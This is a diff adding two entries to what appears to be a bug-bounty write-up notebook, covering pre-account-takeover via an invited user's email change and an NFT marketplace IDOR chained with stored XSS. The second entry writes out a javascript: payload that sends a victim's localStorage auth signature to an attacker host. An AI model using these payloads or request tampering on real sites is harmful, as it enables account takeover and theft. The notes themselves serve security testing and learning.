@@ -1,0 +1,11 @@
+### [45] Pre-ATO via User-Manager email change on an invited (unregistered) user — Bharat Singh (VDP) [DUP reinforcement: change-others'-email → (pre-)ATO]
+- Where: org "User Manager"; invited users show name/login/email; UI blocks editing login+email.
+- Approach/how-found: intercept the edit — changing `login` failed, but changing `email` to a victim address persisted (front + back end) → pre-account-takeover: when the invited user later registers/activates, the attacker-controlled email owns the account.
+- Test: UI-disabled fields are often only disabled client-side — intercept and send them anyway; changing another (esp. invited/unregistered) user's email = (pre-)ATO.
+- Q: "Are 'read-only' fields (login/email/role) enforced server-side or just disabled in the UI? Can I set an invited/unregistered user's email to mine for a pre-ATO?"
+
+### [46] NFT marketplace — IDOR by public wallet `account_address` + `javascript:` stored XSS → steal localStorage signature → ATO — pratik yadav [NEW ★ signature-in-localStorage stolen via XSS; wallet-as-id]
+- Where: profile-update POST with `account_address` (wallet) + `signer` + `signature` (auth token kept in **localStorage**, not a cookie).
+- Approach/how-found: (1) stored XSS: save Twitter/Instagram link as `javascript:alert(document.domain)` → fires on click. (2) IDOR: swap `account_address` to the victim's **public** wallet → edit their profile (email/socials). Chain: as the victim, set their social link to `javascript:token=JSON.stringify(localStorage);fetch(attacker+token)` → when anyone views the victim's profile (or the victim clicks), their `signature` (the real auth) is exfiltrated from localStorage → attacker signs requests to sell/transfer/delete their NFTs. (Changing email alone isn't ATO here — no email auth, wallet-based login — so the signature is the prize.)
+- Test: when auth is a signature/JWT in localStorage, HttpOnly cookies don't protect it — any XSS steals it. Public identifiers (wallet/username/email) used as a write key = IDOR. Try `javascript:` URIs in link fields.
+- Q: "Is the real auth token in localStorage (XSS-stealable)? Is the write keyed by a *public* identifier (wallet/username)? Do link fields allow `javascript:` URIs for stored XSS delivered via an IDOR-modified profile?"
